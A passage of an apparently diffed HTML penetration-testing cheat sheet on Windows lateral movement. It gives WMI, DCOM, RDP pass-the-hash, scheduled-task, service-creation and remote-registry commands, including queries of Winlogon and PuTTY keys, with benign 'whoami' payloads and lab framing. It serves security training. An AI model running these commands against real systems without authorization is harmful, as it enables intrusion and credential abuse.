+<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span>--exec-method<span class="w"> </span>wmiexec
+</span></code></pre></div>
+<p>Windows WMIC:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>wmic /node:HOSTNAME /user:CORP\alice /password:Password123! process call create &quot;cmd.exe /c whoami &gt; C:\Windows\Temp\out.txt&quot;
+</span></code></pre></div>
+<p>PowerShell WMI:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="nb">Invoke-WmiMethod</span> <span class="n">-Class</span> <span class="n">Win32_Process</span> <span class="n">-Name</span> <span class="n">Create</span> <span class="n">-ComputerName</span> <span class="n">HOSTNAME</span> <span class="n">-Credential</span> <span class="n">CORP</span><span class="p">\</span><span class="n">alice</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;cmd.exe /c whoami&quot;</span>
+</span></code></pre></div>
+<p>PowerShell CIM:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="nb">Invoke-CimMethod</span> <span class="n">-ClassName</span> <span class="n">Win32_Process</span> <span class="n">-MethodName</span> <span class="n">Create</span> <span class="n">-ComputerName</span> <span class="n">HOSTNAME</span> <span class="n">-Arguments</span> <span class="p">@{</span><span class="n">CommandLine</span><span class="p">=</span><span class="s2">&quot;cmd.exe /c whoami&quot;</span><span class="p">}</span>
+</span></code></pre></div>
+<p>Common WMI outcomes:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Command executes</td>
+<td>Local admin or equivalent access.</td>
+</tr>
+<tr>
+<td>Authentication succeeds but command fails</td>
+<td>Permission/UAC/firewall issue.</td>
+</tr>
+<tr>
+<td>RPC unavailable</td>
+<td>Firewall or service issue.</td>
+</tr>
+<tr>
+<td>Output missing</td>
+<td>Command ran but output retrieval failed.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="dcom">DCOM</h2>
+<p>DCOM can be used for remote execution through COM objects.</p>
+<p>It usually requires local administrator rights and RPC/DCOM reachability.</p>
+<p>Common tools:</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>dcomexec.py</code></td>
+<td>Impacket DCOM execution.</td>
+</tr>
+<tr>
+<td>PowerShell COM objects</td>
+<td>Windows-native usage.</td>
+</tr>
+</tbody>
+</table>
+<p>Impacket DCOMExec with password:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>dcomexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>dcomexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span>
+</span></code></pre></div>
+<p>With Kerberos:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>dcomexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET_HOST</span>
+</span></code></pre></div>
+<p>Specify object type:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>dcomexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span><span class="w"> </span>-object<span class="w"> </span>MMC20
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>dcomexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span><span class="w"> </span>-object<span class="w"> </span>ShellWindows
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>dcomexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span><span class="w"> </span>-object<span class="w"> </span>ShellBrowserWindow
+</span></code></pre></div>
+<p>Run command:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>dcomexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>PowerShell MMC20.Application example:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="nv">$com</span> <span class="p">=</span> <span class="no">[activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&quot;MMC20.Application&quot;</span><span class="p">,</span><span class="s2">&quot;HOSTNAME&quot;</span><span class="p">))</span>
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="nv">$com</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">ActiveView</span><span class="p">.</span><span class="n">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="s2">&quot;/c whoami &gt; C:\Windows\Temp\out.txt&quot;</span><span class="p">,</span><span class="s2">&quot;7&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<p>DCOM requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>RPC reachable</td>
+<td>Port <code>135</code> and dynamic RPC.</td>
+</tr>
+<tr>
+<td>Admin rights</td>
+<td>Usually required.</td>
+</tr>
+<tr>
+<td>DCOM enabled</td>
+<td>Required on target.</td>
+</tr>
+<tr>
+<td>Firewall allows DCOM</td>
+<td>Common blocker.</td>
+</tr>
+<tr>
+<td>COM object available</td>
+<td>Object must exist and be usable.</td>
+</tr>
+</tbody>
+</table>
+<p>Common failures:</p>
+<table>
+<thead>
+<tr>
+<th>Error</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Access denied</td>
+<td>Missing rights or DCOM restriction.</td>
+</tr>
+<tr>
+<td>RPC server unavailable</td>
+<td>Firewall or service issue.</td>
+</tr>
+<tr>
+<td>COM object not found</td>
+<td>Object type unavailable.</td>
+</tr>
+<tr>
+<td>No output</td>
+<td>Command may run without easy output retrieval.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="rdp">RDP</h2>
+<p>RDP provides interactive remote desktop access.</p>
+<p>It commonly listens on:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>3389/tcp
+</span></code></pre></div>
+<p>RDP access usually requires:</p>
+<ul>
+<li>valid credentials</li>
+<li>RDP enabled</li>
+<li>network reachability</li>
+<li>membership in <code>Remote Desktop Users</code> or local <code>Administrators</code></li>
+<li>NLA compatibility if Network Level Authentication is enabled</li>
+</ul>
+<p>Check RDP port:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-p3389<span class="w"> </span><span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>Check RDP access with NetExec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>nxc<span class="w"> </span>rdp<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>nxc<span class="w"> </span>rdp<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Connect with xfreerdp:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>xfreerdp<span class="w"> </span>/u:<span class="nv">$USER</span><span class="w"> </span>/p:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>/d:<span class="nv">$DOMAIN</span><span class="w"> </span>/v:<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>With dynamic resolution:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>xfreerdp<span class="w"> </span>/u:<span class="nv">$USER</span><span class="w"> </span>/p:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>/d:<span class="nv">$DOMAIN</span><span class="w"> </span>/v:<span class="nv">$TARGET</span><span class="w"> </span>/dynamic-resolution
+</span></code></pre></div>
+<p>Ignore certificate warning:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>xfreerdp<span class="w"> </span>/u:<span class="nv">$USER</span><span class="w"> </span>/p:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>/d:<span class="nv">$DOMAIN</span><span class="w"> </span>/v:<span class="nv">$TARGET</span><span class="w"> </span>/cert:ignore
+</span></code></pre></div>
+<p>Pass-the-Hash with Restricted Admin if enabled:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>xfreerdp<span class="w"> </span>/u:<span class="nv">$USER</span><span class="w"> </span>/pth:<span class="nv">$NTLM</span><span class="w"> </span>/d:<span class="nv">$DOMAIN</span><span class="w"> </span>/v:<span class="nv">$TARGET</span><span class="w"> </span>/cert:ignore
+</span></code></pre></div>
+<p>Enable drive mapping in a lab:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>xfreerdp<span class="w"> </span>/u:<span class="nv">$USER</span><span class="w"> </span>/p:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>/d:<span class="nv">$DOMAIN</span><span class="w"> </span>/v:<span class="nv">$TARGET</span><span class="w"> </span>/drive:share,/tmp<span class="w"> </span>/cert:ignore
+</span></code></pre></div>
+<p>Windows MSTSC:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>mstsc /v:HOSTNAME
+</span></code></pre></div>
+<p>Check current RDP sessions from target:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>query user
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>qwinsta
+</span></code></pre></div>
+<p>Common RDP outcomes:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Login succeeds</td>
+<td>Interactive access.</td>
+</tr>
+<tr>
+<td>Valid creds but denied</td>
+<td>Missing RDP rights.</td>
+</tr>
+<tr>
+<td>NLA error</td>
+<td>NLA or auth compatibility issue.</td>
+</tr>
+<tr>
+<td>Account restricted</td>
+<td>Logon restriction or policy.</td>
+</tr>
+<tr>
+<td>PTH fails</td>
+<td>Restricted Admin not enabled or blocked.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="scheduled-tasks">Scheduled Tasks</h2>
+<p>Scheduled tasks can execute commands remotely on Windows systems.</p>
+<p>Remote task creation usually requires local administrator rights.</p>
+<p>Windows <code>schtasks</code> remote create:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>schtasks /Create /S HOSTNAME /U CORP\alice /P Password123! /TN TestTask /SC ONCE /ST 23:59 /TR &quot;cmd.exe /c whoami &gt; C:\Windows\Temp\out.txt&quot;
+</span></code></pre></div>
+<p>Run task:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>schtasks /Run /S HOSTNAME /U CORP\alice /P Password123! /TN TestTask
+</span></code></pre></div>
+<p>Delete task:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>schtasks /Delete /S HOSTNAME /U CORP\alice /P Password123! /TN TestTask /F
+</span></code></pre></div>
+<p>Impacket atexec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>atexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>atexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>With Kerberos:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>atexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET_HOST</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>NetExec using atexec method:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span>--exec-method<span class="w"> </span>atexec
+</span></code></pre></div>
+<p>PowerShell scheduled task:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a><span class="nv">$Action</span> <span class="p">=</span> <span class="nb">New-ScheduledTaskAction</span> <span class="n">-Execute</span> <span class="s2">&quot;cmd.exe&quot;</span> <span class="n">-Argument</span> <span class="s2">&quot;/c whoami &gt; C:\Windows\Temp\out.txt&quot;</span>
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a><span class="nv">$Trigger</span> <span class="p">=</span> <span class="nb">New-ScheduledTaskTrigger</span> <span class="n">-Once</span> <span class="n">-At</span> <span class="p">(</span><span class="nb">Get-Date</span><span class="p">).</span><span class="n">AddMinutes</span><span class="p">(</span><span class="n">1</span><span class="p">)</span>
+</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a><span class="nb">Register-ScheduledTask</span> <span class="n">-TaskName</span> <span class="s2">&quot;TestTask&quot;</span> <span class="n">-Action</span> <span class="nv">$Action</span> <span class="n">-Trigger</span> <span class="nv">$Trigger</span> <span class="n">-User</span> <span class="s2">&quot;SYSTEM&quot;</span>
+</span><span id="__span-75-4"><a id="__codelineno-75-4" name="__codelineno-75-4" href="#__codelineno-75-4"></a><span class="nb">Start-ScheduledTask</span> <span class="n">-TaskName</span> <span class="s2">&quot;TestTask&quot;</span>
+</span></code></pre></div>
+<p>Common scheduled task outcomes:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Task created</td>
+<td>Admin or task creation rights exist.</td>
+</tr>
+<tr>
+<td>Task runs</td>
+<td>Execution path works.</td>
+</tr>
+<tr>
+<td>No output</td>
+<td>Command ran without output path or permissions.</td>
+</tr>
+<tr>
+<td>Access denied</td>
+<td>Missing local admin or policy restrictions.</td>
+</tr>
+<tr>
+<td>Task deleted</td>
+<td>Cleanup completed in lab.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="services">Services</h2>
+<p>Remote service creation is a common lateral movement method.</p>
+<p>It usually requires local administrator rights and access to the Service Control Manager.</p>
+<p>Windows <code>sc.exe</code> remote service creation:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>sc.exe \\HOSTNAME create TestSvc binPath= &quot;cmd.exe /c whoami &gt; C:\Windows\Temp\out.txt&quot;
+</span></code></pre></div>
+<p>Start service:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>sc.exe \\HOSTNAME start TestSvc
+</span></code></pre></div>
+<p>Delete service:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>sc.exe \\HOSTNAME delete TestSvc
+</span></code></pre></div>
+<p>With explicit credentials, use a shell running as that user or use a tool that supports credentials.</p>
+<p>Impacket PsExec uses a service-based technique:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>psexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>NetExec service execution:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span>--exec-method<span class="w"> </span>smbexec
+</span></code></pre></div>
+<p>Alternative exec methods:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span>--exec-method<span class="w"> </span>wmiexec
+</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span>--exec-method<span class="w"> </span>atexec
+</span></code></pre></div>
+<p>PowerShell service creation:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a><span class="nb">New-Service</span> <span class="n">-Name</span> <span class="n">TestSvc</span> <span class="n">-BinaryPathName</span> <span class="s2">&quot;cmd.exe /c whoami &gt; C:\Windows\Temp\out.txt&quot;</span>
+</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a><span class="nb">Start-Service</span> <span class="n">TestSvc</span>
+</span></code></pre></div>
+<p>Remote PowerShell service creation through Invoke-Command:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">HOSTNAME</span> <span class="n">-Credential</span> <span class="n">CORP</span><span class="p">\</span><span class="n">alice</span> <span class="n">-ScriptBlock</span> <span class="p">{</span>
+</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>    <span class="nb">New-Service</span> <span class="n">-Name</span> <span class="n">TestSvc</span> <span class="n">-BinaryPathName</span> <span class="s2">&quot;cmd.exe /c whoami &gt; C:\Windows\Temp\out.txt&quot;</span>
+</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3" href="#__codelineno-83-3"></a>    <span class="nb">Start-Service</span> <span class="n">TestSvc</span>
+</span><span id="__span-83-4"><a id="__codelineno-83-4" name="__codelineno-83-4" href="#__codelineno-83-4"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Common service outcomes:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Service created</td>
+<td>SCM write access exists.</td>
+</tr>
+<tr>
+<td>Service starts</td>
+<td>Command execution path works.</td>
+</tr>
+<tr>
+<td>Service fails quickly</td>
+<td>Normal for one-shot commands.</td>
+</tr>
+<tr>
+<td>Access denied</td>
+<td>Missing local admin or SCM rights.</td>
+</tr>
+<tr>
+<td>Binary blocked</td>
+<td>AV/EDR or path restriction.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="remote-registry">Remote Registry</h2>
+<p>Remote Registry allows reading or modifying registry hives on a remote machine.</p>
+<p>It can be useful for enumeration, session discovery, auto-logon checks, installed software, and some credential-related checks.</p>
+<p>Common requirement:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>Remote Registry service running or startable
+</span></code></pre></div>
+<p>Check Remote Registry with NetExec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--reg-sessions
+</span></code></pre></div>
+<p>Enable/start service if authorized and local admin:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>sc.exe \\HOSTNAME query RemoteRegistry
+</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a>sc.exe \\HOSTNAME start RemoteRegistry
+</span></code></pre></div>
+<p>Query remote registry:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>reg query \\HOSTNAME\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
+</span></code></pre></div>
+<p>Check Winlogon keys:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>reg query \\HOSTNAME\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+</span></code></pre></div>
+<p>Check saved PuTTY sessions:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>reg query \\HOSTNAME\HKCU\Software\SimonTatham\PuTTY\Sessions
+</span></code></pre></div>
+<p>Remote registry sessions with NetExec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--reg-sessions
+</span></code></pre></div>
+<p>Impacket reg:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>reg.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span><span class="w"> </span>query<span class="w"> </span>-keyName<span class="w"> </span>HKLM<span class="se">\\</span>SOFTWARE<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>CurrentVersion
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>reg.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span>query<span class="w"> </span>-keyName<span class="w"> </span>HKLM<span class="se">\\</span>SOFTWARE<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>CurrentVersion
+</span></code></pre></div>
+<p>Useful registry paths:</p>
